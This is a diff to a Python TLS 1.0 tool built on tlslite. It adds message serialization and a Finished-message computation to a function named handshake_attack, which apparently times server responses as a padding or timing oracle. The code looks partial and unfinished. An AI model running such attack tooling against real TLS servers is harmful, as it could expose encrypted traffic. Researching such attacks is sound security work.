@@ -1,11 +1,13 @@
 import code
 import gc
 import io
-import rdtsc
+
+# import rdtsc
 import secrets
 import socket
 
 from collections import namedtuple
+from tlslite.mathtls import MD5, SHA1, PRF, calcMasterSecret
 from tlslite.x509 import X509
 
 from ctypes import *
@@ -14,7 +16,7 @@ from tlslite.constants import *
 
 TLS_VERSION_1_0 = 769
 
-# lazy
+# lazy boys just copy+paste from Wireshark captures:
 X509_CERT_TYPE_EXTENSION = int.from_bytes(
     bytes.fromhex("000900020100"), byteorder="big"
 )
@@ -76,10 +78,71 @@ class Alert(namedtuple("Alert", ["level", "description"])):
 
         return cls(level, description)
 
+    def __len__(self):
+        return 2
 
-class HandshakeFinished(namedtuple("HandshakeFinished", [])):
+
+class ClientFinished(
+    namedtuple("ClientFinished", ["pre_master_secret", "handshake_messages"])
+):
+    """
+    Final message sent by client as part of TLS handshake. This is the
+    first message which the client sends using the ciphers and keys
+    negotiated during the handshake. Its goal is to allow the server
+    to verify the client is correctly setup.
+
+    Defined as
+      PRF(master_secret,
+          finished_label,
+          MD5(handshake_messages) + SHA-1(handshake_messages))[0:11]
+
+    with
+      master_secret := PRF(pre_master_secret, "master secret",
+                           client_random + server_random)[0:47]
+      finished_label := "client"
+      handshake_messages := <concatenation of the all previous
+                             handshake messages, at the handshake
+                             layer (i.e. with the tls header removed)>
+
+    Reference: https://tools.ietf.org/html/rfc2246#section-7.4.9
+    """
+
+    FINISHED_LABEL = b"client finished"
+
     def to_bytes(self):
-        return bytes([0x01])
+        [client_hello] = [
+            msg.body
+            for msg in self.handshake_messages
+            if msg.handshake_type == HandshakeType.client_hello
+        ]
+        [server_hello] = [
+            msg.body
+            for msg in self.handshake_messages
+            if msg.handshake_type == HandshakeType.server_hello
+        ]
+
+        negotiated_version = server_hello.version
+        negotiated_version = negotiated_version.to_bytes(2, byteorder="big")
+        negotiated_version = (negotiated_version[0], negotiated_version[1])
+        negotiated_cipher_suite = server_hello.cipher_suite
+
+        handshake_messages = b"".join([m.to_bytes() for m in self.handshake_messages])
+
+        master_secret = calcMasterSecret(
+            negotiated_version,
+            negotiated_cipher_suite,
+            self.pre_master_secret,
+            client_hello.random_bytes,
+            server_hello.random_bytes,
+        )
+        finished = PRF(
+            master_secret,
+            self.FINISHED_LABEL,
+            MD5(handshake_messages) + SHA1(handshake_messages),
+            12,
+        )
+        print(finished)
+        return finished
 
     @classmethod
     def from_bytes(cls, raw):
@@ -87,6 +150,9 @@ class HandshakeFinished(namedtuple("HandshakeFinished", [])):
             return cls()
         else:
             return False
+
+    def __len__(self):
+        return 12
 
 
 class ChangeCipherSpec(namedtuple("ChangeCipherSpec", [])):
@@ -99,6 +165,9 @@ class ChangeCipherSpec(namedtuple("ChangeCipherSpec", [])):
             return cls()
         else:
             return False
+
+    def __len__(self):
+        return 2 + 128
 
 
 class ClientKeyExchange(namedtuple("ClientKeyExchange", ["enc_premaster_secret"])):
@@ -113,6 +182,9 @@ class ClientKeyExchange(namedtuple("ClientKeyExchange", ["enc_premaster_secret"]
     def from_bytes(cls, raw):
         return cls(bytes(raw[2:]))
 
+    def __len__(self):
+        return 2 + 128
+
 
 class ServerHelloDone(namedtuple("ServerHelloDone", [])):
     def to_bytes(self):
@@ -122,8 +194,22 @@ class ServerHelloDone(namedtuple("ServerHelloDone", [])):
     def from_bytes(cls, raw):
         return cls()
 
+    def __len__(self):
+        return 0
+
 
 class Certificate(namedtuple("Certificate", ["certificates"])):
+    def to_bytes(self):
+        raw_certs = b""
+        for cert in self.certificates:
+            raw_cert = cert.bytes
+            raw_cert_length = int.to_bytes(len(raw_cert), 3, byteorder="big")
+            raw_certs += raw_cert_length + raw_cert
+
+        raw_total_length = int.to_bytes(len(raw_certs), 3, byteorder="big")
+
+        return raw_total_length + raw_certs
+
     @classmethod
     def from_bytes(cls, raw):
         length = int.from_bytes(raw[0:3], byteorder="big")
@@ -148,6 +234,9 @@ class Certificate(namedtuple("Certificate", ["certificates"])):
 
         return cls(certs)
 
+    def __len__(self):
+        return len(self.to_bytes())
+
 
 class ServerHello(
     namedtuple(
@@ -162,6 +251,28 @@ class ServerHello(
         ],
     )
 ):
+    def to_bytes(self):
+        raw_version = int.to_bytes(self.version, 2, byteorder="big")
+        raw_timestamp = int.to_bytes(self.timestamp, 4, byteorder="big")
+        raw_random = self.random_bytes
+        raw_session_id = self.session_id
+        raw_session_id_length = int.to_bytes(len(raw_session_id), 1, byteorder="big")
+        raw_cipher_suite = int.to_bytes(
+            self.cipher_suite, HELLO_CIPHER_SUITE_SIZE, byteorder="big"
+        )
+        raw_compression_method = int.to_bytes(
+            self.compression_method, HELLO_COMPRESSION_METHOD_SIZE, byteorder="big"
+        )
+        return (
+            raw_version
+            + raw_timestamp
+            + raw_random
+            + raw_session_id_length
+            + raw_session_id
+            + raw_cipher_suite
+            + raw_compression_method
+        )
+
     @classmethod
     def from_bytes(cls, raw):
         offset = 0
@@ -194,6 +305,9 @@ class ServerHello(
         return cls(
             version, timestamp, random, session_id, cipher_suite, compression_method
         )
+
+    def __len__(self):
+        return len(self.to_bytes())
 
 
 class ClientHello(
@@ -245,6 +359,9 @@ class ClientHello(
             ]
         )
 
+    def __len__(self):
+        return len(self.to_bytes())
+
 
 class Handshake(namedtuple("Handshake", ["handshake_type", "body"])):
     def to_bytes(self):
@@ -267,9 +384,14 @@ class Handshake(namedtuple("Handshake", ["handshake_type", "body"])):
             HandshakeType.server_hello: ServerHello,
             HandshakeType.server_hello_done: ServerHelloDone,
             HandshakeType.certificate: Certificate,
+            HandshakeType.client_key_exchange: ClientKeyExchange,
+            HandshakeType.finished: ClientFinished,
         }[handshake_type].from_bytes(raw_body[0:length])
 
         return cls(handshake_type, body)
+
+    def __len__(self):
+        return len(self.to_bytes())
 
 
 class Record(namedtuple("Record", ["content_type", "version", "body"])):
@@ -296,7 +418,7 @@ class Record(namedtuple("Record", ["content_type", "version", "body"])):
             # ContentType.change_cipher_spec: ChangeCipherSpec,
         }[content_type].from_bytes(raw_body[0:length])
 
-        return cls(content_type, version, body, raw[0 : 5 + length])
+        return cls(content_type, version, body)
 
     def __len__(self):
         return len(self.to_bytes())
@@ -344,13 +466,26 @@ def handshake_attack(sock, g):
     change_cipher_spec = Record(
         ContentType.change_cipher_spec, TLS_VERSION_1_0, ChangeCipherSpec()
     )
-    encrypted_handshake = Record(ContentType.handshake, TLS_VERSION_1_0)
+    finished = Record(
+        ContentType.handshake,
+        TLS_VERSION_1_0,
+        ClientFinished(
+            bytes.fromhex("00" * 48),
+            [
+                client_hello.body,
+                server_hello.body,
+                certificates.body,
+                server_hello_done.body,
+                client_key_exchange.body,
+            ],
+        ),
+    )
     # Concat these messages together and send at the same time. This
     # should reduce the variance from network latencies.
     final_message = (
         client_key_exchange.to_bytes()
         + change_cipher_spec.to_bytes()
-        + encrypted_handshake.to_bytes()
+        + finished.to_bytes()
     )
 
     # Go!
